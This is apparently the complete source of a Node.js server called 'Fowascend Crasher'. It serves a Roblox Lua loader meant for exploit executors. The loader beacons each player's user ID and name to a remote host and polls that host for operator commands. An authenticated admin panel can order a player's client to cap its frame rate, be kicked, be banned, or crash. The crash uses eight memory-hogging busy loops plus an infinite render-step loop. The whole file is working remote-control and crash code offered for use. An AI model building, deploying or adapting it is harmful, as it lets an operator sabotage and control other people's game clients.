// server.js - Fowascend Crasher - Fixed
// Adds: /loader.lua serves Lua from server, /raw loader route, crash fix, global-friendly CORS, uptime-friendly.

const express = require('express');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;
const PUBLIC_URL = process.env.PUBLIC_URL || 'https://crasherscript-production.up.railway.app';

const RAW_PANEL_PASSWORD = process.env.PANEL_PASSWORD;
const PANEL_PASSWORD = (RAW_PANEL_PASSWORD && RAW_PANEL_PASSWORD.trim()) || 'CHANGE_ME_IN_ENV';
const API_KEY = process.env.API_KEY || 'fowascend';
const SESSION_TTL = 1000 * 60 * 60 * 4;

console.log('[AUTH] PANEL_PASSWORD env present:', !!RAW_PANEL_PASSWORD);
console.log('[AUTH] PANEL_PASSWORD length after trim:', PANEL_PASSWORD.length);
if (PANEL_PASSWORD === 'CHANGE_ME_IN_ENV') {
    console.warn('[AUTH] WARNING: Using default PANEL_PASSWORD. Set PANEL_PASSWORD in Railway variables.');
}

const sessions = new Map();
const loginAttempts = new Map();

function makeToken() {
    return crypto.randomBytes(32).toString('hex');
}

function requireAuth(req, res, next) {
    const token = req.headers['x-session-token'] || req.query.token;
    if (!token) return res.status(401).json({ error: 'No token' });
    const exp = sessions.get(token);
    if (!exp || exp < Date.now()) {
        sessions.delete(token);
        return res.status(401).json({ error: 'Invalid or expired token' });
    }
    next();
}

function requireApiKey(req, res, next) {
    const key = req.headers['x-api-key'] || req.query.key;
    if (key !== API_KEY) return res.status(401).json({ error: 'Invalid API key' });
    next();
}

function loginRateLimit(req, res, next) {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    const now = Date.now();
    const windowMs = 60 * 1000;
    const maxAttempts = 10;
    const rec = loginAttempts.get(ip) || { count: 0, firstAt: now };
    if (now - rec.firstAt > windowMs) {
        rec.count = 0;
        rec.firstAt = now;
    }
    rec.count++;
    loginAttempts.set(ip, rec);
    if (rec.count > maxAttempts) {
        return res.status(429).json({ error: 'Too many attempts. Try again later.' });
    }
    next();
}

app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'X-Api-Key', 'X-Session-Token']
}));
app.use(express.json({ limit: '10mb' }));

const players = new Map();
const bannedPlayers = new Map();
const crashFlags = new Map(); // separate store so crash never gets cleared prematurely

// ============================================
// AUTH
// ============================================
app.post('/api/auth/login', loginRateLimit, (req, res) => {
    const { password } = req.body || {};
    if (!password) return res.status(400).json({ error: 'Missing password' });

    const input = String(password);
    const expected = PANEL_PASSWORD;

    const a = Buffer.from(input);
    const b = Buffer.from(expected);
    const ok = a.length === b.length && crypto.timingSafeEqual(a, b);
    if (!ok) {
        console.warn('[AUTH] Password mismatch');
        return res.status(401).json({ error: 'Invalid password' });
    }

    const token = makeToken();
    sessions.set(token, Date.now() + SESSION_TTL);
    res.json({ token, expires: Date.now() + SESSION_TTL });
});

app.post('/api/auth/logout', requireAuth, (req, res) => {
    const token = req.headers['x-session-token'];
    sessions.delete(token);
    res.json({ ok: true });
});

app.get('/api/auth/check', requireAuth, (req, res) => {
    res.json({ ok: true });
});

// ============================================
// LOADER (self-hosting Lua so no Pastefy needed)
// ============================================
function buildLoader() {
    return `--[[ Fowascend Crasher - Auto Loader ]]--
local BASE = "${PUBLIC_URL}"
local KEY = "${API_KEY}"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local function rawRequest(method, url, body)
    local options = {
        Url = url,
        Method = method,
        Headers = {
            ["Content-Type"] = "application/json",
            ["X-Api-Key"] = KEY,
            ["User-Agent"] = "FowascendClient/1.0"
        }
    }
    if method == "POST" and body then options.Body = body end

    if syn and syn.request then
        local ok, res = pcall(syn.request, options); if ok and res then return res end
    end
    if request then
        local ok, res = pcall(request, options); if ok and res then return res end
    end
    if http and http.request then
        local ok, res = pcall(http.request, options); if ok and res then return res end
    end
    if fluxus and fluxus.request then
        local ok, res = pcall(fluxus.request, options); if ok and res then return res end
    end
    if http_request then
        local ok, res = pcall(http_request, options); if ok and res then return res end
    end

    if method == "GET" then
        local ok, res = pcall(game.HttpGet, game, url); if ok and res then return res end
    elseif method == "POST" then
        local ok, res = pcall(game.HttpPost, game, url, body, "application/json"); if ok and res then return res end
    end
    return nil
end

local function sendRequest(method, url, data)
    for attempt = 1, 3 do
        local res = rawRequest(method, url, data)
        if res then
            if type(res) == "table" and res.Body then return res.Body
            elseif type(res) == "string" then return res end
        end
        task.wait(0.5 * attempt)
    end
    return nil
end

local LP = Players.LocalPlayer
if not LP then
    for _ = 1, 300 do
        task.wait(0.1)
        LP = Players.LocalPlayer
        if LP then break end
    end
end
if not LP then return end

local function heartbeat()
    local banUrl = BASE .. "/api/public/checkban?user_id=" .. tostring(LP.UserId)
    local banRes = sendRequest("GET", banUrl, nil)
    if banRes and banRes ~= "" then
        local ok, banData = pcall(function() return HttpService:JSONDecode(banRes) end)
        if ok and banData and banData.banned == true then
            task.wait(0.5)
            LP:Kick("🐱 You have been banned from this session.")
            return
        end
    end
    local payload = HttpService:JSONEncode({
        user_id = LP.UserId,
        username = LP.Name,
        display_name = LP.DisplayName,
        executor = "FowascendClient",
        online = true
    })
    sendRequest("POST", BASE .. "/api/public/heartbeat", payload)
end

local fpsBinding, fpsConnection, fpsActive = nil, nil, false
local function clearFPS()
    if fpsBinding then pcall(function() RunService:UnbindFromRenderStep(fpsBinding) end); fpsBinding = nil end
    if fpsConnection then pcall(function() fpsConnection:Disconnect() end); fpsConnection = nil end
    fpsActive = false
end

local function setFPSLimit(targetFPS)
    clearFPS()
    targetFPS = tonumber(targetFPS)
    if not targetFPS or targetFPS <= 0 then
        if setfpscap then pcall(function() setfpscap(60) end) end
        return
    end
    if targetFPS > 240 then targetFPS = 240 end
    if setfpscap then
        local ok = pcall(function() setfpscap(targetFPS) end)
        if ok then return end
    end
    fpsActive = true
    local frameTime = 1 / targetFPS
    fpsBinding = "FowascendFPSLimiter_" .. tostring(math.random(1, 1e9))
    local ok = pcall(function()
        RunService:BindToRenderStep(fpsBinding, Enum.RenderPriority.Camera.Value + 1, function(dt)
            if not fpsActive then return end
            local t0 = os.clock()
            local need = frameTime - dt
            if need > 0 then while (os.clock() - t0) < need do end end
        end)
    end)
    if not ok then
        fpsBinding = nil
        local last = os.clock()
        fpsConnection = RunService.Heartbeat:Connect(function()
            if not fpsActive then return end
            local now = os.clock()
            local elapsed = now - last
            if elapsed < frameTime then task.wait(frameTime - elapsed) end
            last = os.clock()
        end)
    end
end

-- AGGRESSIVE CRASH: multiple parallel loops, memory pressure, infinite yields
local crashThreads = {}
local function crashGame()
    if #crashThreads > 0 then return end
    for i = 1, 8 do
        local t = task.spawn(function()
            while true do
                local x = 0
                for j = 1, 1000000 do x = x + j end
                local t2 = {}
                for j = 1, 500 do t2[#t2 + 1] = string.rep("X", 20000) end
                task.wait()
            end
        end)
        table.insert(crashThreads, t)
    end
    -- Additional render step sabotage
    pcall(function()
        RunService:BindToRenderStep("FowascendCrash", 1, function()
            while true do end
        end)
    end)
end

local pollRunning = false
local function poll()
    if pollRunning then return end
    pollRunning = true
    local url = BASE .. "/api/public/command?user_id=" .. tostring(LP.UserId)
    local result = sendRequest("GET", url, nil)
    if result and result ~= "" then
        local ok, data = pcall(function() return HttpService:JSONDecode(result) end)
        if ok and data then
            if data.fps_limit ~= nil then
                if data.fps_limit == false or data.fps_limit == 0 then
                    setFPSLimit(nil)
                else
                    setFPSLimit(tonumber(data.fps_limit))
                end
            end
            if data.crash == true then crashGame() end
            if data.kick == true then
                task.wait(0.5)
                LP:Kick(data.kick_message or "You have been kicked.")
            end
            if data.ban == true then
                task.wait(0.5)
                LP:Kick(data.ban_message or "🐱 You have been banned from this session.")
            end
        end
    end
    pollRunning = false
end

heartbeat()
task.wait(3)
task.spawn(function() while true do poll(); task.wait(0.5) end end)
task.spawn(function() while true do heartbeat(); task.wait(5) end end)
`;
}

// Public loader URL - no API key needed, so it works as a loadstring for anyone
app.get('/loader.lua', (req, res) => {
    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
    res.send(buildLoader());
});

// Alias
app.get('/raw', (req, res) => {
    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
    res.send(buildLoader());
});

// ============================================
// PUBLIC CLIENT ENDPOINTS
// ============================================
app.get('/api/public/checkban', (req, res) => {
    const { user_id } = req.query;
    if (!user_id) return res.json({ banned: false });
    res.json({ banned: bannedPlayers.has(String(user_id)) });
});

app.post('/api/public/heartbeat', (req, res) => {
    const data = req.body;
    if (!data || !data.user_id) return res.status(400).json({ error: 'Missing user_id' });
    const userId = String(data.user_id);

    if (bannedPlayers.has(userId)) return res.json({ status: 'banned' });

    const existing = players.get(userId) || {};
    players.set(userId, {
        ...existing,
        ...data,
        user_id: userId,
        online: true,
        lastHeartbeat: Date.now(),
        fps_limit: existing.fps_limit !== undefined ? existing.fps_limit : false,
        _kick: existing._kick || false,
        _kick_message: existing._kick_message || '',
        _ban: existing._ban || false,
        _ban_message: existing._ban_message || ''
    });

    res.json({ status: 'ok' });
});

app.get('/api/public/command', (req, res) => {
    const userId = req.query.user_id;
    if (!userId) return res.status(400).json({ error: 'Missing user_id' });
    const p = players.get(String(userId));
    if (!p) return res.json({});

    const response = {};

    if (p.fps_limit !== undefined && p.fps_limit !== false) {
        response.fps_limit = p.fps_limit;
        p.fps_limit = false;
    }
    if (p._kick) {
        response.kick = true;
        response.kick_message = p._kick_message || "You have been kicked.";
        p._kick = false;
        p._kick_message = '';
    }
    if (p._ban) {
        response.ban = true;
        response.ban_message = p._ban_message || "🐱 You have been banned from this session.";
        p._ban = false;
        p._ban_message = '';
    }

    // CRASH uses separate store so it never gets lost
    if (crashFlags.get(String(userId))) {
        response.crash = true;
        crashFlags.delete(String(userId));
    }

    players.set(String(userId), p);
    res.json(response);
});

// ============================================
// PROTECTED ADMIN
// ============================================
app.get('/api/players', requireAuth, (req, res) => {
    const list = [];
    const now = Date.now();
    const OFFLINE_THRESHOLD = 15000;

    for (const [id, p] of players.entries()) {
        if (bannedPlayers.has(id)) continue;
        const online = (now - (p.lastHeartbeat || 0)) < OFFLINE_THRESHOLD;
        list.push({
            user_id: p.user_id,
            username: p.username,
            display_name: p.display_name,
            online: online
        });
    }
    res.json({ players: list });
});

app.post('/api/command', requireAuth, (req, res) => {
    const { user_id, fps_limit, kick, kick_message, crash, ban, ban_message } = req.body;
    if (!user_id) return res.status(400).json({ error: 'Missing user_id' });
    const userId = String(user_id);
    const p = players.get(userId);
    if (!p) return res.status(404).json({ error: 'Player not found' });

    if (fps_limit !== undefined) {
        p.fps_limit = parseInt(fps_limit) || false;
    }
    if (kick === true) {
        p._kick = true;
        p._kick_message = kick_message || "You have been kicked.";
    }
    if (crash === true) {
        crashFlags.set(userId, true);
        console.log(`💥 CRASH SENT TO: ${p.username || userId}`);
    }
    if (ban === true) {
        p._ban = true;
        p._ban_message = ban_message || "🐱 You have been banned from this session.";
        bannedPlayers.set(userId, { username: p.username, bannedAt: Date.now() });
    }

    players.set(userId, p);
    res.json({ status: 'ok' });
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🐱 Fowascend Crasher Server running on port ${PORT}`);
    console.log(`📍 Public URL: ${PUBLIC_URL}`);
});
